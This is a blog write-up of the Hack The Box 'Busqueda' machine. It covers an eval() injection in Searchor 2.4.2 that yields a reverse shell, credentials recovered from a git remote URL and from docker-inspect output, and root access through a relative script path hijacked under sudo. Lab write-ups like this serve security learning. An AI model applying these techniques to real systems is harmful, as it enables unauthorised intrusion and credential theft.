---
layout: post
title: Busqueda - HTB Writeup
date: 2023-07-26 23:32:39.000000000 -05:00
categories: [Hackthebox]
tags: []
author: traysoncombs
permalink: "/busqueda-htb.html"
---

![](/static/img/2023/07/Busqueda-1024x775.png)

## Enumeration

I started this one off by checking out the website to see if I could find anything interesting and after a little investigating noticed some app called searchor listed, it even included a version!

![](/static/img/2023/07/image.png)

After googling said app and version I discovered the version in question has a vulnerability. Apparently they used eval() with unsanitized user input meaning anyone can pass code to be executed into eval, read more here: https://github.com/jonnyzar/POC-Searchor-2.4.2. Someone also posted a POC so it was simply a matter of starting a netcat listener and running the exploit.

```bash
endit@pop-os ~/Desktop/http [1] $ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.208 41638
bash: cannot set terminal process group (1657): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$
```

From there I cd'd into home and read the flag. Awesome, onto root.

## Privilege Escalation

After getting user I looked around for a bit and found that the domain gitea.searcher.htb was in the /etc/hosts file. So I added it to mine and checked it out. There were two users, administrator and cody.

![](/static/img/2023/07/tempsnip-1024x435.png)

Neither had any public repos and I couldn't find any other interesting things so I decided to keep looking elsewhere. Eventually I decided to checkout the directory where searcher was hosted, which was /var/www/app. Turned out it was git repo, so I ran a couple git commands to see if there was anything I could find. Turns out the user Cody created an http remote and included his password:

```bash
svc@busqueda:/var/www/app$ git remote get-url origin
http://cody:jh1us-------------@gitea.searcher.htb/cody/Searcher_site.git
```

Awesome! Now we have creds we can use with gitea.
I logged in and found a whole lot of nothing, so I decided to try the creds with the svc account in my shell to see if I can do anything with sudo and they worked.
I ran sudo -l and found this:

```bash
svc@busqueda:~$ sudo -l
User svc may run the following commands on busqueda:
         (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Cool so we can run this script as root. The script basically allows you to do some maintenance stuff with docker, which was apparently where gitea was being run. The script had a couple options:

```bash
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

	docker-ps     : List running docker containers
	docker-inspect : Inpect a certain docker container
	full-checkup  : Run a full system checkup
```

The interesting one was docker-inspect as it allowed me to dump a bunch of interesting information from the gitea container, namely a mysql password.

```json
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config.Env}}' gitea
[
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
]
```

This also happened to be the password for the administrator user in gitea. So I logged in and discovered the source of the system-checkup.py script that we can run as root.

![](/static/img/2023/07/image-3-1024x385.png)

The script was relatively simple and included this nice little bit that took me an embarrassing amount of time to figure out how to exploit:

```python
elif action == 'full-checkup':
	try:
		arg_list = ['./full-checkup.sh']
		print(run_command(arg_list))
		print('[+] Done!')
	except:
		print('Something went wrong')
		exit(1)
```

All I had to do was the run the script from a directory containing my own full-checkup.sh script and I could execute whatever I wanted. I opted to just read the flag and write it to a file in /tmp, although popping a shell would've been pretty easy.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
		[+] Done!
svc@busqueda:~$ cat /tmp/effefefef
18742e5c49d----------------------
```

And just like that we got the flag!
